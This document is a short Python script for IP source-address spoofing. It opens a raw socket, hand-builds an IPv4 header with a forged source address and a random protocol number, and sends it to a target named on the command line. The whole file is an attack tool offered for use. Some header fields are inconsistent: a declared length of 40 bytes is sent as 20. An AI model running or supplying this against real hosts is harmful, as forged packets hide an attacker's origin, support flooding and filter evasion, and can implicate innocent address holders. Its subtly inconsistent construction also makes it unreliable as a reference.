import socket
import random
import sys

def spoof_packet(source_ip, dest_ip):
    # Create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error as e:
        print("Socket creation failed: %s" % e)
        sys.exit()

    # Construct the IP header
    ip_header = b''
    ip_header += b'\x45'  # IP version (4) and header length (5 words)
    ip_header += b'\x00'  # Type of service
    ip_header += b'\x00\x28'  # Total length (40 bytes)
    ip_header += b'\xab\xcd'  # Identification
    ip_header += b'\x40\x00'  # Flags and Fragment Offset
    ip_header += b'\x40'  # Time to Live (64)
    ip_header += bytes([random.randint(0, 255)])  # Protocol (random)
    ip_header += b'\x00\x00'  # Header checksum
    ip_header += bytes(map(int, source_ip.split('.')))  # Source IP address
    ip_header += bytes(map(int, dest_ip.split('.')))  # Destination IP address

    # Spoof the packet
    try:
        s.sendto(ip_header, (dest_ip, 0))
        print("Packet sent successfully!")
    except socket.error as e:
        print("Packet sending failed: %s" % e)
    finally:
        s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python ip_spoof.py <source_ip> <dest_ip>")
        sys.exit(1)

    source_ip = sys.argv[1]
    dest_ip = sys.argv[2]
    spoof_packet(source_ip, dest_ip)
